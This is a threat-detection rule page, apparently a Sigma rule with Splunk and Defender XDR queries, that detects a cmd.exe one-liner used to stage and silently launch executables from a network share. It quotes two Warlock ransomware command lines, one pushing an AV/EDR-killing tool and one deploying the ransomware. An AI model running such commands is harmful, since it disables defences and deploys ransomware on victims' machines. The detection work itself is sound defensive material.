Cmd Copies Files From Network Share To Users Public And Starts Them In Background

HighExperimentalWindows · process creation
Download .yml View on GitHub

What it detects

Detects a cmd.exe one-liner that copies files from a UNC share and then launches an executable from C:\Users\Public with start /B cmd /c "... 2>nul || exit".

Why this rule exists

Symantec reports that the Warlock ransomware attackers pushed an AV/EDR-killing tool with net use \\[IP_ADDRESS] ... & copy \\[IP_ADDRESS]\av\* CSIDL_PROFILE\public /y & start /B cmd /c "c:\users\public\a.exe log 2>nul || exit" and deployed the ransomware with copy \\[REMOVED]\SYSVOL\[VICTIM DOMAIN]\scripts\run\* CSIDL_PROFILE\public /y & start /B cmd /c "c:\users\public\run.exe 2>nul || exit".

detection:
    selection_img:
        - Image|endswith: '\cmd.exe'
        - OriginalFileName: 'Cmd.Exe'
    selection_cli:
        CommandLine|contains|all:
            - 'copy \\\\'
            - 'start /B cmd /c'
            - '\users\public\'
            - '2>nul || exit'
    condition: all of selection_*
falsepositives:
    - Software deployment or logon scripts that stage an installer from a file share into C:\Users\Public and start it silently in the background
level: high
Sysmon + Splunk Windows field mapping
source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="*\\cmd.exe" OR OriginalFileName="Cmd.Exe" CommandLine="*copy \\\\*" CommandLine="*start /B cmd /c*" CommandLine="*\\users\\public\\*" CommandLine="*2>nul || exit*"
Microsoft Defender XDR advanced hunting
DeviceProcessEvents
| where (FolderPath endswith "\\cmd.exe" or ProcessVersionInfoOriginalFileName =~ "Cmd.Exe") and (ProcessCommandLine contains "copy \\\\" and ProcessCommandLine contains "start /B cmd /c" and ProcessCommandLine contains "\\users\\public\\" and ProcessCommandLine contains "2>nul || exit")
